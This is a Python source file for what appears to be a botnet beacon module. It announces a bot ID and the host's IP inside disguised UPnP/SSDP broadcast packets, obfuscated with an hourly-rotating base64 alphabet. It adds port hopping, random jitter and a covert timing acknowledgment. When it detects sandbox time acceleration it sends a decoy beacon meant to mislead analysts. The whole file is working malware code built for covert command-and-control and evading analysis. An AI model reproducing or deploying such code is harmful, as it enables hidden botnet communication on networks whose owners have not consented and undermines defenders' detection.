import os
import socket
import time
import random
import ctypes
import base64
# wintypes only used on Windows but imported by some code paths
if os.name == 'nt':
    from ctypes import wintypes
else:
    class _Wintypes:
        DWORD = int
    wintypes = _Wintypes()
from core.network.limiter import next_interval

import threading

# maintain current port index for hopping
_PORTS = [1900, 137, 5353, 5355]
_current_idx = 0
# used by receiver to signal ack via slight interval change
ack_signal = threading.Event()


def _rolling_xor(data: bytes, key: int) -> bytes:
    return bytes(b ^ (key & 0xFF) for b in data)


def _rotate_b64(data: bytes) -> str:
    # standard alphabet
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    hour = time.gmtime().tm_hour % len(alphabet)
    rotated = alphabet[hour:] + alphabet[:hour]
    enc = base64.b64encode(data).decode("ascii")
    trans = str.maketrans(alphabet, rotated)
    return enc.translate(trans)


def _rotate_b64_inverse(text: str) -> bytes:
    """Reverse the rotating base64 transformation."""
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    hour = time.gmtime().tm_hour % len(alphabet)
    rotated = alphabet[hour:] + alphabet[:hour]
    trans = str.maketrans(rotated, alphabet)
    norm = text.translate(trans)
    return base64.b64decode(norm)


def _build_xml(bot_id: str, ip: str) -> bytes:
    # embed info in USN field
    usn_val = _rotate_b64(f"{bot_id}|{ip}".encode("utf-8"))
    usn = f"uuid:upnp-RootDevice-{usn_val}"
    xml = (
        "<root xmlns=\"urn:schemas-upnp-org:device-1-0\">"
        "<device>"
        "<deviceType>urn:schemas-upnp-org:device:Basic:1</deviceType>"
        f"<friendlyName>TRIAD Beacon</friendlyName>"
        f"<UDN>{usn}</UDN>"
        "</device></root>"
    )
    # build SSDP NOTIFY packet
    hdr = (
        "NOTIFY * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "NT: upnp:rootdevice\r\n"
        "NTS: ssdp:alive\r\n"
        f"USN: {usn}\r\n"
        "\r\n"
    )
    return (hdr + xml).encode("utf-8")


def _next_port(err: bool = False) -> int:
    global _current_idx
    if err:
        # hop to next available port
        _current_idx = (_current_idx + 1) % len(_PORTS)
    return _PORTS[_current_idx]


def start_stochastic_beacon(bot_id: str, base_interval: float = 1.0) -> None:
    """Spawn a background thread that emits beacons with stochastic jitter."""
    def _run():
        last_time = time.time()
        paused = False
        while True:
            # detect sandbox time acceleration
            now = time.time()
            if not paused and now - last_time > base_interval * 3:
                # send fake beacon then hibernate
                _send_fake()
                break
            last_time = now
            # craft packet
            ip = "0.0.0.0"
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 53))
                ip = s.getsockname()[0]
                s.close()
            except Exception:
                pass
            packet = _build_xml(bot_id, ip)
            port = _next_port()
            err = False
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                start = time.time()
                s.sendto(packet, ("255.255.255.255", port))
                elapsed = time.time() - start
                s.close()
                if elapsed > 0.1:
                    err = True
            except Exception as e:
                err = True
            if err:
                _next_port(err=True)
            # sleep with stochastic jitter
            interval = next_interval(base_interval)
            if ack_signal.is_set():
                # add a small extra delay as implicit acknowledgment
                interval += 0.2
                ack_signal.clear()
            time.sleep(interval)
    thr = None
    try:
        import threading
        thr = threading.Thread(target=_run, daemon=True)
        thr.start()
    except Exception:
        # if threading unavailable, run inline (blocking)
        _run()


def _send_fake():
    # send a bogus, random beacon to misdirect analysts
    fake_id = hex(random.getrandbits(32))[2:]
    fake_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
    packet = _build_xml(fake_id, fake_ip)
    port = random.choice(_PORTS)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        s.sendto(packet, ("255.255.255.255", port))
        s.close()
    except Exception:
        pass
